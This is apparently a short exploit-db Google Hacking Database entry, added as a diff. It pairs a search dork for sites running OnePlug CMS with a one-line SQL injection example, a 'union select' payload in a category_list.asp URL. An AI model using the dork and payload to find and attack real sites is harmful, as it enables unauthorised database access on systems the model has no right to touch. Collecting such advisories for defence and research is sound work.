@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3702
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-03-16
+Author:           anonymous
+GoogleDork:       intext:"Powered by OnePlug CMS"
+Description:      intext:"Powered by OnePlug CMS"
+
+
+Sumitter: p0pc0rn SQL Injection: http://site.com/category_list.asp?Category_ID=1 union select 0 from test.a
